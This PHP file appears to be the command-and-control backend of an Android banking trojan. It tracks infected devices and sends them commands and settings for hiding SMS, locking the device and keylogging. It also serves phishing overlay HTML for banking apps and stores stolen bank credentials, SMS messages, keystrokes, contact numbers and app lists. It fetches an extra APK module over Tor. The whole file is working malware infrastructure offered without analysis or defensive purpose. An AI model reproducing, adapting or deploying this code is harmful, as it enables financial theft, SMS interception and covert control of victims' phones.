<?php
class bots_con{

	static private $_connection = null;
	static function Connection()
	{
		if (!self::$_connection)
		{
			self::$_connection = new PDO('mysql:host='.server.';dbname='.db, user, passwd);
		}
		return self::$_connection;
	}

	private function tableExists($tblName)
	{
		$connection = self::Connection();
		$statement = $connection->prepare("SELECT COUNT(*) as cnt from INFORMATION_SCHEMA.TABLES where table_name = ?");	
		$statement->execute([$tblName]);
		$tableCount = $statement->fetchColumn();
		if ( $tableCount != 0 )
			return true;
		return false;
	}

	function getIpBot() {
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		  $ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		  $ip = $_SERVER['REMOTE_ADDR'];
		}
		return $ip;
	  }

	function checkIdBot($ID, $IP, $screen, $accessibility, $number, $statAdmin, 
	$statProtect, $statSMS, $statCards, $statBanks, $statMails, 
	$activeDevice, $timeWorking, $statDownloadModule,$locale, $batteryLevel){

		if(strlen($ID)<=14){
			return "2";
		}

		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot FROM bots WHERE idbot=?");
		$statement->execute([$ID]);
		foreach($statement as $row){
				$date = date('Y-m-d H:i:s');
				$statement = $connection->prepare("UPDATE bots SET statScreen = ?, 
				lastconnect = ?, statAccessibility = ?, ip = ?, 
				phoneNumber = ?, statAdmin = ?, statProtect = ?,
				statSMS = ?, statCards = ?, statBanks = ?,
				statMails = ?, activeDevice = ?, timeWorking = ?,
				statDownloadModule = ?, locale = ?, batteryLevel = ? WHERE idbot = ?");

				$statement->execute(array($screen,$date,$accessibility,$IP,$number, $statAdmin, 
				$statProtect, $statSMS, $statCards, $statBanks, $statMails, 
				$activeDevice, $timeWorking,$statDownloadModule,$locale,$batteryLevel,$ID));
				return "1";
		}
		return "0";
	}


	function getCommandBot($ID){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		//--- Get Commands ---//
		$statement = $connection->prepare("SELECT commands FROM bots WHERE idbot=?");
		$statement->execute(array($ID));
		foreach($statement as $row){
			if(!empty($row['commands'])){
				$statement = $connection->prepare("UPDATE bots SET commands='' WHERE idbot=?");
				$statement->execute(array($ID)); //clean commands
				return '{"this":"~commands~","data":"'.$row['commands'].'" }';
			}
		}
		//--- Get My Settings ---//
		$statement = $connection->prepare("SELECT updateSettings FROM bots WHERE idbot=?");
		$statement->execute(array($ID));
		foreach($statement as $row){
			if(strcmp($row['updateSettings'], "1") == 0){

				$statement2 = $connection->prepare("SELECT * FROM settingBots WHERE idbot=?");
				$statement2->execute(array($ID));
				$json = '{"this":"~mySettings~",';
				foreach($statement2 as $row2){
					if(strcmp($row2['idbot'], "$ID") == 0){
						$json = $json.'"hideSMS":"'.$row2['hideSMS'].'",';
						$json = $json.'"lockDevice":"'.$row2['lockDevice'].'",';
						$json = $json.'"offSound":"'.$row2['offSound'].'",';
						$json = $json.'"keylogger":"'.$row2['keylogger'].'",';
						$json = $json.'"activeInjection":"'.$row2['activeInjection'].'"}';
					}
				}
				$statement = $connection->prepare("UPDATE bots SET updateSettings = '0' WHERE idbot = ?");
				$statement->execute(array($ID)); // return 0 settings bots

				if($json == '{"this":"~mySettings~",'){
					return '{"this":"no_command"}';
				}
				return $json;
			}
		}
		return '{"this":"no_command"}';
	}
	
	function getGlobalSettings($ID){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		//--- Get Global Settings ---//
		$statement = $connection->prepare("SELECT * FROM settings");
		$statement->execute();
		foreach($statement as $row){
			if(strcmp($row['saveID'], $ID) != 0){
				return '{"this":"~settings~","saveID":"'.$row['saveID'].'","arrayUrl":"'.$row['arrayUrl'].'","timeInject":"'.$row['timeInject'].'","timeProtect":"'.$row['timeProtect'].'","timeCC":"'.$row['timeCC'].'","timeMail":"'.$row['timeMail'].'"}';
			}
		}
		return "0";
	}

	function addBot($ip, $idbot, $android, $tag, $country, $operator, $model){
		if((strlen($idbot)<=14)||($this->existBotToID($idbot))){
			return "no_reg";
		}

		$date = date('Y-m-d H:i');
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("insert into bots (idbot, ip, android, TAG, country, lastconnect, date_infection, operator, model)
		value ('$idbot','$ip','$android','$tag','$country','$date','$date','$operator','$model')");
		$statement->execute(array($idbot,$android,$tag,$country,$date,$operator,$model));

		$statement = $connection->prepare("SELECT idbot FROM settingBots WHERE idbot=?");
		$statement->execute(array($ID));
		$bool = false;
		foreach($statement as $row){//check settingBots
			$bool = true;
		}
		if(!$bool){
			$statement2 = $connection->prepare("insert into settingBots (idbot, hideSMS, lockDevice, offSound, keylogger, activeInjection)
			value ('$idbot','0','0','0','0','')");
			$statement2->execute(array($idbot));
		}
		return "ok";
	}

	function updateInjection($ID, $apps){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot FROM bots WHERE idbot=?");
		$statement->execute([$ID]);
		$allInjections = "";

		foreach($statement as $row){
			if(strcmp($row['idbot'], $ID) == 0){
				$arrayApps = explode(":", $apps);
				foreach($arrayApps as $app){
					if(!empty($app)){
						$statement2 = $connection->prepare("SELECT app FROM dataInjections WHERE app=?");
						$statement2->execute([$app]);
						foreach($statement2 as $row2){
							$allInjections = $allInjections.":".$row2['app'];
						}
					}	
				}
				$statement3 = $connection->prepare("UPDATE bots SET banks = '$allInjections' WHERE idbot=?");
				$statement3->execute([$ID]);
			}
		}
		if(empty($allInjections)){$allInjections = "||no||";}
		return "$allInjections";
	}

	function getInjection($ip, $injection){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT ip FROM bots WHERE ip=?");
		$statement->execute(array($ip));
		foreach($statement as $row){
				$statement = $connection->prepare("SELECT app, html FROM dataInjections WHERE app=?");
				$statement->execute([$injection]);
				foreach($statement as $row){
					return base64_decode($row['html']);
				}
		}
		return "";
	}

	function getIcon($ip, $injection){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT ip FROM bots WHERE ip=?");
		$statement->execute(array($ip));
		foreach($statement as $row){
				$statement = $connection->prepare("SELECT app, icon FROM dataInjections WHERE app=?");
				$statement->execute([$injection]);
				foreach($statement as $row){
					return $row['icon'];
				}
		}
		return "";
	}

	function addInjection($ip, $idbot, $idInject, $application, $dataInjection){ //-------------------------------------------!!!!!!
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		
		$dataInjection = base64_encode($dataInjection);

		$nameInject = "";
		/*if(preg_match('/grabCC/', $application)) {
			$application = str_replace("grabCC","", $application);
			$nameInject = "grabCC";
		}else if(preg_match('/grabMails/', $application)){
			$application = str_replace("grabMails","", $application);
			$nameInject = "grabMails";
		}*/
	
		$statement3 = $connection->prepare("SELECT ip, idbot FROM bots WHERE idbot=?");
		$statement3->execute(array($idbot));
		foreach($statement3 as $row3){
			if((strcmp($row3['ip'], $ip) == 0) && (strcmp($row3['idbot'], $idbot) == 0)){
				
				if(empty($nameInject)){
					$statement = $connection->prepare("SELECT idinj FROM logsBank WHERE idinj=?");
					$statement->execute([$idInject]);
				}/*else if($nameInject=="grabCC"){
					$statement = $connection->prepare("SELECT idinj FROM logsCC WHERE idinj=?");
					$statement->execute([$idInject]);
				}else if($nameInject=="grabMails"){
					$statement = $connection->prepare("SELECT idinj FROM logsMail WHERE idinj=?");
					$statement->execute([$idInject]);
				}*/

				foreach($statement as $row){
					if(strcmp($row['idinj'], $idInject) == 0){

						if(empty($nameInject)){
							$statement = $connection->prepare("UPDATE logsBank SET logs = ? WHERE idinj = ?");
							$statement->execute(array($dataInjection,$idInject));
						}/*else if($nameInject=="grabCC"){
							$statement = $connection->prepare("UPDATE logsCC SET logs = ? WHERE idinj = ?");
							$statement->execute(array($dataInjection,$idInject));
						}else if($nameInject=="grabMails"){
							$statement = $connection->prepare("UPDATE logsMail SET logs = ? WHERE idinj = ?");
							$statement->execute(array($dataInjection,$idInject));
						}*/
						
						$statement2 = $connection->prepare("SELECT activeInjection FROM settingBots WHERE idbot=?");
						$statement2->execute([$idbot]);
						foreach($statement2 as $row2){
							$activeInjection = $row2['activeInjection'];

							if(empty($nameInject)){
								$activeInjection = str_replace(":$application","",$activeInjection);
							}else{
								$activeInjection = str_replace(":$nameInject","",$activeInjection);
							}

							$activeInjection = str_replace(":$application","",$activeInjection);
							$statement = $connection->prepare("UPDATE settingBots SET activeInjection = ? WHERE idbot = ?");
							$statement->execute(array($activeInjection,$idbot));
						}
						return "ok";
					}
				}


				if(empty($nameInject)){	
					$statement = $connection->prepare("insert into logsBank (idinj, idbot, application, logs)
					value ('$idInject','$idbot','$application','$dataInjection')");
					$statement->execute(array($idInject, $idbot, $application, $dataInjection));
				}/*else if($nameInject=="grabCC"){
					$statement = $connection->prepare("insert into logsCC (idinj, idbot, application, logs)
					value ('$idInject','$idbot','$application','$dataInjection')");
					$statement->execute(array($idInject, $idbot, $application, $dataInjection));
				}else if($nameInject=="grabMails"){
					$statement = $connection->prepare("insert into logsMail (idinj, idbot, application, logs)
					value ('$idInject','$idbot','$application','$dataInjection')");
					$statement->execute(array($idInject, $idbot, $application, $dataInjection));
				}*/

				$statement2 = $connection->prepare("SELECT activeInjection FROM settingBots WHERE idbot=?");
				$statement2->execute([$idbot]);
				foreach($statement2 as $row2){
					$activeInjection = $row2['activeInjection'];

					if(empty($nameInject)){
						$activeInjection = str_replace(":$application","",$activeInjection);
					}else{
						$activeInjection = str_replace(":$nameInject","",$activeInjection);
					}
					
					$statement = $connection->prepare("UPDATE settingBots SET activeInjection = ? WHERE idbot = ?");
					$statement->execute(array($activeInjection,$idbot));
				}
				return "ok";
			}
		}
		return "";
	}

	function addLogSms($ip, $idbot, $logs, $dateToDevice){
		if($this->existBots($ip, $idbot)){
			$dateToServer = date('Y-m-d H:i');
			$connection = self::Connection();
			$connection->exec('SET NAMES utf8');
			$statement = $connection->prepare("SELECT ID FROM LogsSMS_$idbot LIMIT 1");
			$statement->execute(array($idbot));
			$arrayLogs = explode("::endLog::", $logs);

			$isTableLogs = false;
			foreach($statement as $row){
				$isTableLogs = true;
				foreach($arrayLogs as $log){
					if(strlen($log)>4){
						$log = base64_encode(str_replace("::endLog::","",$log));
						$statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
						value ('$log','$dateToServer','$dateToDevice')");
						$statement->execute(array($log, $dateToServer, $dateToDevice));
					}
				}
				return "ok";
			}
			if(!$isTableLogs){
				$statement = $connection->prepare("CREATE TABLE `LogsSMS_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, `datetoserver` VARCHAR(25) NOT NULL,`datetodevice` VARCHAR(25) NOT NULL, PRIMARY KEY (`ID`)) ");
				$statement->execute(array($idbot));

				foreach($arrayLogs as $log){
					if(strlen($log)>4){
						$log = base64_encode(str_replace("::endLog::","",$log));
						$statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
						value (?,?,?)");
						$statement->execute(array($log, $dateToServer, $dateToDevice));
					}
				}

				return "ok";
			}
		}
		return "";
	}

	function timeInjectStart($idbot,$inject){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot, banks FROM bots WHERE idbot=?");
		$statement->execute([$idbot]);
		foreach($statement as $row){
			$banks = $row['banks'];
			$statement3 = $connection->prepare("SELECT activeInjection FROM settingBots WHERE idbot=?");
			$statement3->execute([$idbot]);
			foreach($statement3 as $row3){//check activeInject isNull ?
				$activeInjection = $row3['activeInjection'];
				switch ($inject) {
					case "banks":
					if(empty($activeInjection)){
						$statement2 = $connection->prepare("UPDATE settingBots SET activeInjection = ? WHERE idbot=?");
						$statement2->execute(array($banks,$idbot));
						$statement2 = $connection->prepare("UPDATE bots SET updateSettings = '1' WHERE idbot=?");
						$statement2->execute(array($idbot));
					}
					return "ok_banks";
					break;
					/*case "grabCC":
					if(empty($activeInjection)){
						$inject=":$inject";
						$statement2 = $connection->prepare("UPDATE settingBots SET activeInjection = ? WHERE idbot=?");
						$statement2->execute(array($inject,$idbot));
						$statement2 = $connection->prepare("UPDATE bots SET updateSettings = '1' WHERE idbot=?");
						$statement2->execute(array($idbot));
					}
					return "ok_grabCC";
					break;
					case "grabMails":
					$inject = "$activeInjection:$inject";
					$statement2 = $connection->prepare("UPDATE settingBots SET activeInjection = ? WHERE idbot=?");
					$statement2->execute(array($inject,$idbot));
					$statement2 = $connection->prepare("UPDATE bots SET updateSettings = '1' WHERE idbot=?");
					$statement2->execute(array($idbot));
					return "ok_grabMails";
					break;*/
				}
			}
		}
		return "";
	}

	function addLogKeylogger($ip, $idbot, $logs){
		if($this->existBots($ip, $idbot)){
			$connection = self::Connection();
			$connection->exec('SET NAMES utf8');
			$statement = $connection->prepare("SELECT ID FROM keylogger_$idbot LIMIT 1");
			$statement->execute(array($idbot));
			$arrayLogs = explode(":endlog:", $logs);

			$isTableLogs = false;
			foreach($statement as $row){
				$isTableLogs = true;
				foreach($arrayLogs as $log){
					if(strlen($log)>4){
						$log = base64_encode(str_replace(":endlog:","",$log));
						$statement = $connection->prepare("insert into keylogger_$idbot (logs) value (?)");
						$statement->execute(array($log));
					}
				}
				return "ok";
			}
			if(!$isTableLogs){
				$statement = $connection->prepare("CREATE TABLE `keylogger_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, PRIMARY KEY (`ID`)) ");
				$statement->execute(array($idbot));

				foreach($arrayLogs as $log){
					if(strlen($log)>4){
						$log = base64_encode(str_replace(":endlog:","",$log));
						$statement = $connection->prepare("insert into keylogger_$idbot (logs) value (?)");
						$statement->execute(array($log));
					}
				}
				return "ok";
			}
		}
		return "";
	}

	function sendListSavedSMS($ip, $idbot, $logs){
		if($this->existBots($ip, $idbot)){
			$connection = self::Connection();
			$connection->exec('SET NAMES utf8');
			$logs = base64_encode($logs);
			$statement = $connection->prepare("SELECT idbot FROM logsBotsSMS WHERE idbot=?");
			$statement->execute(array($idbot));
			foreach($statement as $row){ //check data logs
				if(strcmp($row['idbot'], $idbot) == 0){
					$statement = $connection->prepare("UPDATE logsBotsSMS SET logs = ? WHERE idbot=?");
					$statement->execute(array($logs,$idbot));
					return "ok";
				}
			}
			$statement = $connection->prepare("insert into logsBotsSMS (idbot, logs) value (?,?)");
			$statement->execute(array($idbot,$logs));
			return "ok";
		}
		return "";
	}

	function sendListPhoneNumbers($ip, $idbot, $logs){
		if($this->existBots($ip, $idbot)){
			$connection = self::Connection();
			$connection->exec('SET NAMES utf8');
			$logs = base64_encode($logs);
			$statement = $connection->prepare("SELECT idbot FROM logsPhoneNumber WHERE idbot=?");
			$statement->execute(array($idbot));
			foreach($statement as $row){ //check data logs
				if(strcmp($row['idbot'], $idbot) == 0){
					$statement = $connection->prepare("UPDATE logsPhoneNumber SET logs = ? WHERE idbot=?");
					$statement->execute(array($logs,$idbot));
					return "ok";
				}
			}
			$statement = $connection->prepare("insert into logsPhoneNumber (idbot, logs) value (?,?)");
			$statement->execute(array($idbot, $logs));
			return "ok";
		}
		return "";
	}


	function sendListApplications($ip, $idbot, $logs){
		if($this->existBots($ip, $idbot)){
			$connection = self::Connection();
			$connection->exec('SET NAMES utf8');
			$logs = base64_encode($logs);
			$statement = $connection->prepare("SELECT idbot FROM logsListApplications WHERE idbot=?");
			$statement->execute(array($idbot));
			foreach($statement as $row){ //check data logs
				if(strcmp($row['idbot'], $idbot) == 0){
					$statement = $connection->prepare("UPDATE logsListApplications SET logs = ? WHERE idbot=?");
					$statement->execute(array($logs,$idbot));
					return "ok";
				}
			}
			$statement = $connection->prepare("insert into logsListApplications (idbot,logs)value(?,?)");
			$statement->execute(array($idbot, $logs));
			return "ok";
		}
		return "";
	}

	function getApkModule($ip, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot, ip FROM bots WHERE idbot=?");
		$statement->execute(array($idbot));
	
		foreach($statement as $row){
			if((strcmp($row['idbot'], $idbot) == 0) && (strcmp($row['ip'], $ip) == 0)){
				//return base64_encode(file_get_contents("panel/module.apk"));
				$time = $this->sendPostTOR("時間");
				$dataHash = "";
				for($i=0;$i<strlen($time);$i++){
					$s = substr($time,$i,1);
					if(is_numeric($s)){
						$dataHash = "$dataHash$s"; 
					}
				}
				$hash = "";
					foreach(array("sha512","sha256") as $sha){
					if(empty($hash)){
						$hash = openssl_digest($dataHash, $sha);
					}else{
						$hash = openssl_digest($hash, $sha);
					}
				}
				return $this->sendPostTOR($hash);
			}	
		}
		//return "";
	}

	function sendPost($key){
		$url = url_global_server.'gate.php';
		$data = "key=$key";
		$options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => $data));
		$context  = stream_context_create($options);
		return file_get_contents($url, false, $context);
	}

	function sendPostTOR($key){
		$ch = curl_init(url_global_server.'gate.php?key='.$key);
		curl_setopt_array($ch, [
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5_HOSTNAME,
			CURLOPT_PROXY          => '127.0.0.1:9050',
			CURLOPT_HEADER         => 0,
			CURLOPT_FOLLOWLOCATION => 1,
			CURLOPT_ENCODING       => '',
			CURLOPT_COOKIEFILE     => '',
		]);
		return curl_exec($ch);
	}

	function existBots($ip, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot, ip FROM bots WHERE idbot=?");
		$statement->execute(array($idbot));
		foreach($statement as $row){if((strcmp($row['idbot'],$idbot) == 0)&&(strcmp($row['ip'], $ip)==0)){return true;}}
		return false;
	}
	function existBotToID($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT idbot FROM bots WHERE idbot=?");
		$statement->execute(array($idbot));
		foreach($statement as $row){if(strcmp($row['idbot'],$idbot) == 0){return true;}}
		return false;
	}
}
